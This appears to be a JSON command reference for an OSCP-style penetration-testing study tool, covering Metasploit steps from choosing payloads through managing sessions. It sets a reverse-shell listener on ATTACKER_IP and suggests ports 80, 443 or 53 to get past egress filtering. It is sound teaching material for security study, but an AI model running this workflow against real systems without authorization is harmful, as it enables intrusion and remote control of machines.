{
  "category": "exploitation",
  "commands": [
    {
      "id": "msf-show-payloads",
      "name": "List Compatible Payloads",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "show payloads",
      "description": "Display all payloads compatible with currently selected exploit module",
      "tags": ["METASPLOIT", "PAYLOADS", "EXPLOIT"],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Compatible Payloads list with name, rank, description",
        "Staged vs non-staged variants shown"
      ],
      "failure_indicators": [
        "No module selected"
      ],
      "next_steps": ["msf-set-payload"],
      "alternatives": [],
      "prerequisites": ["msf-use-module"],
      "troubleshooting": {
        "no_module_selected": "Use exploit module first with: use <EXPLOIT_PATH>"
      },
      "notes": "Payloads with single slash (/) are staged, double underscore (_) indicates non-staged. Choose based on space constraints and detection considerations.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-set-payload",
      "name": "Set Exploit Payload",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "set payload <PAYLOAD_PATH>",
      "description": "Configure payload for currently selected exploit module",
      "tags": ["METASPLOIT", "PAYLOADS", "CONFIGURATION"],
      "variables": [
        {
          "name": "<PAYLOAD_PATH>",
          "description": "Full payload path or index from 'show payloads' output",
          "example": "windows/x64/meterpreter/reverse_tcp",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "payload => <path> confirmation",
        "'show options' displays payload options section"
      ],
      "failure_indicators": [
        "Payload not compatible with module",
        "Invalid payload path"
      ],
      "next_steps": ["msf-set-lhost", "msf-exploit-run"],
      "alternatives": [],
      "prerequisites": ["msf-use-module", "msf-show-payloads"],
      "troubleshooting": {
        "incompatible_payload": "Use 'show payloads' to see compatible payloads only"
      },
      "notes": "Payload selection determines post-exploit capabilities. Meterpreter payloads provide advanced features but are larger. Shell payloads are simpler and smaller.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-set-lhost",
      "name": "Set Listener Host (Attacker IP)",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "set LHOST <ATTACKER_IP>",
      "description": "Configure local IP address for reverse shell connection or bind shell interface",
      "tags": ["METASPLOIT", "PAYLOAD_CONFIG", "NETWORKING"],
      "variables": [
        {
          "name": "<ATTACKER_IP>",
          "description": "Attacker's IP address (where target will connect back) or interface name",
          "example": "192.168.45.5",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "LHOST => <IP> confirmation",
        "Value shown in 'show options' under Payload options"
      ],
      "failure_indicators": [
        "Invalid IP address format"
      ],
      "next_steps": ["msf-set-lport", "msf-exploit-run"],
      "alternatives": ["setg LHOST <IP> (for global setting)"],
      "prerequisites": ["msf-set-payload"],
      "troubleshooting": {
        "wrong_interface": "Use interface name (eth0, tun0) instead of IP for VPN scenarios",
        "multiple_ips": "Specify correct IP if machine has multiple interfaces (check with: ip a)"
      },
      "notes": "Common mistake: using wrong IP on multi-homed systems. For VPN connections, use tun0 or VPN IP. Can use interface name: set LHOST tun0",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-set-lport",
      "name": "Set Listener Port",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "set LPORT <PORT>",
      "description": "Configure local port for listener (reverse shell) or bind port",
      "tags": ["METASPLOIT", "PAYLOAD_CONFIG", "NETWORKING"],
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port number for listener (1-65535)",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "LPORT => <PORT> confirmation"
      ],
      "failure_indicators": [
        "Port out of range",
        "Port already in use"
      ],
      "next_steps": ["msf-exploit-run"],
      "alternatives": [],
      "prerequisites": ["msf-set-payload"],
      "troubleshooting": {
        "port_in_use": "Choose different port or kill process using it: sudo lsof -ti:<PORT> | xargs kill",
        "firewall_blocking": "Use common ports (80, 443, 53) to bypass egress filtering"
      },
      "notes": "Default LPORT is 4444 (often blocked by firewalls). Use ports 80, 443, or 53 for better success against egress filtering. Requires root for ports < 1024.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-show-targets",
      "name": "Display Exploit Targets",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "show targets",
      "description": "List available target configurations for exploit module (OS versions, architectures, methods)",
      "tags": ["METASPLOIT", "EXPLOIT", "TARGETS"],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Available targets list with ID and name",
        "Default target marked with asterisk"
      ],
      "failure_indicators": [
        "No module selected",
        "Module has only one universal target"
      ],
      "next_steps": ["msf-set-target"],
      "alternatives": [],
      "prerequisites": ["msf-use-module"],
      "troubleshooting": {},
      "notes": "Target 0 is usually 'Automatic' detection. Manual target selection more reliable if you know exact OS version. Some modules have targets for different exploitation methods.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msf-set-target",
      "name": "Set Exploit Target",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "set target <TARGET_ID>",
      "description": "Manually select target configuration instead of relying on automatic detection",
      "tags": ["METASPLOIT", "EXPLOIT", "CONFIGURATION"],
      "variables": [
        {
          "name": "<TARGET_ID>",
          "description": "Target ID number from 'show targets' output",
          "example": "1",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "target => <ID> confirmation",
        "Target name displayed"
      ],
      "failure_indicators": [
        "Invalid target ID"
      ],
      "next_steps": ["msf-exploit-run"],
      "alternatives": [],
      "prerequisites": ["msf-show-targets"],
      "troubleshooting": {
        "wrong_target": "Verify target OS version matches module target exactly"
      },
      "notes": "Manual target selection recommended if automatic detection fails. Choosing wrong target may crash service or fail silently.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msf-exploit-check",
      "name": "Check Vulnerability Without Exploiting",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "check",
      "description": "Verify target vulnerability without attempting exploitation (if module supports checking)",
      "tags": ["METASPLOIT", "EXPLOIT", "VALIDATION", "SAFE_TESTING"],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "The target is vulnerable",
        "The target appears to be vulnerable",
        "Detected version information"
      ],
      "failure_indicators": [
        "The target is not vulnerable",
        "Check not supported by module",
        "Could not determine vulnerability"
      ],
      "next_steps": ["msf-exploit-run"],
      "alternatives": [],
      "prerequisites": ["msf-use-module", "msf-set-option"],
      "troubleshooting": {
        "check_not_supported": "Review module info - not all modules support checking",
        "false_negative": "Some checks are unreliable - try exploit if confident"
      },
      "notes": "Use 'check' before exploitation to verify vulnerability without risk of crashing service. 'Check supported: Yes' shown in module info. Some checks are version-based only (may have false positives/negatives).",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-exploit-run",
      "name": "Run Exploit Module",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "exploit",
      "description": "Execute the configured exploit module and launch payload",
      "tags": ["METASPLOIT", "EXPLOIT", "EXECUTION"],
      "variables": [],
      "flag_explanations": {
        "exploit": "Run exploit and interact with session if successful",
        "run": "Alias for 'exploit'",
        "exploit -j": "Run exploit as background job",
        "exploit -z": "Don't interact with session after success (background)",
        "run -j": "Run as background job (same as exploit -j)"
      },
      "success_indicators": [
        "Started reverse TCP handler",
        "Exploit completed successfully",
        "Session opened",
        "Meterpreter session or command shell session"
      ],
      "failure_indicators": [
        "Exploit failed",
        "Exploit completed but no session created",
        "Connection refused",
        "Target not vulnerable"
      ],
      "next_steps": ["msf-session-interact", "msf-session-background"],
      "alternatives": [],
      "prerequisites": ["msf-use-module", "msf-set-payload", "msf-set-lhost", "msf-set-lport"],
      "troubleshooting": {
        "no_session_created": "Check: 1) Target vulnerable? 2) Network connectivity? 3) Payload compatible? 4) Firewall blocking?",
        "exploit_crashed_service": "Target may be patched or wrong target selected",
        "handler_not_started": "Verify LHOST/LPORT set correctly and port available"
      },
      "notes": "Use 'exploit -j' to run in background and continue working. Session auto-created on success. Exploit failures common - try different payloads, targets, or manual exploitation.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-sessions-list",
      "name": "List Active Sessions",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "sessions -l",
      "description": "Display all active sessions created by exploits or auxiliary modules",
      "tags": ["METASPLOIT", "SESSION_MANAGEMENT"],
      "variables": [],
      "flag_explanations": {
        "sessions": "List active sessions (same as sessions -l)",
        "sessions -l": "List all sessions with details",
        "sessions -v": "Verbose listing with more information",
        "sessions -K": "Kill all sessions"
      },
      "success_indicators": [
        "Active sessions table with ID, Name, Type, Information, Connection",
        "Session count shown"
      ],
      "failure_indicators": [
        "No active sessions"
      ],
      "next_steps": ["msf-session-interact"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Session IDs are sequential integers. Type shows payload used (meterpreter, shell, etc). Use session ID to interact with specific target.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-session-interact",
      "name": "Interact with Session",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "sessions -i <SESSION_ID>",
      "description": "Switch to interactive mode with specified session",
      "tags": ["METASPLOIT", "SESSION_MANAGEMENT", "INTERACTION"],
      "variables": [
        {
          "name": "<SESSION_ID>",
          "description": "Session ID number from 'sessions -l' output",
          "example": "1",
          "required": true
        }
      ],
      "flag_explanations": {
        "-i": "Interact with session",
        "-k": "Kill specified session",
        "-c": "Run command on session"
      },
      "success_indicators": [
        "Starting interaction with <ID>",
        "Prompt changes to meterpreter> or shell prompt",
        "Session becomes active"
      ],
      "failure_indicators": [
        "Invalid session ID",
        "Session died"
      ],
      "next_steps": ["meterpreter-sysinfo", "shell-command"],
      "alternatives": [],
      "prerequisites": ["msf-sessions-list"],
      "troubleshooting": {
        "session_died": "Session may have closed - check with: sessions -l",
        "no_interaction": "Some sessions timeout - regenerate payload if lost"
      },
      "notes": "Background active session with Ctrl+Z. Sessions persist until explicitly killed or connection lost. Multiple sessions manageable simultaneously.",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-session-background",
      "name": "Background Active Session",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "background",
      "description": "Send current session to background and return to msfconsole prompt",
      "tags": ["METASPLOIT", "SESSION_MANAGEMENT"],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Backgrounding session <ID>",
        "Returns to msf6 exploit(...)> prompt"
      ],
      "failure_indicators": [
        "No active session"
      ],
      "next_steps": ["msf-session-interact", "msf-use-module"],
      "alternatives": ["Ctrl+Z (interactive shortcut)"],
      "prerequisites": ["msf-session-interact"],
      "troubleshooting": {},
      "notes": "Use Ctrl+Z as shortcut. Session remains active in background. Return to session with: sessions -i <ID>",
      "oscp_relevance": "high"
    },
    {
      "id": "msf-jobs-list",
      "name": "List Background Jobs",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "jobs",
      "description": "Display all running background jobs (exploits, handlers, auxiliary modules)",
      "tags": ["METASPLOIT", "JOB_MANAGEMENT", "BACKGROUND"],
      "variables": [],
      "flag_explanations": {
        "jobs": "List all jobs",
        "jobs -K": "Kill all jobs",
        "jobs -k <ID>": "Kill specific job"
      },
      "success_indicators": [
        "Jobs table with ID, Name, Payload, Payload opts",
        "Job count shown"
      ],
      "failure_indicators": [
        "No active jobs"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "job_not_stopping": "Kill forcefully with: jobs -k <ID>"
      },
      "notes": "Jobs are background tasks - exploits running with -j, multi/handler listeners, etc. Jobs don't equal sessions - jobs create sessions. Kill listener with: jobs -k <ID>",
      "oscp_relevance": "medium"
    }
  ]
}
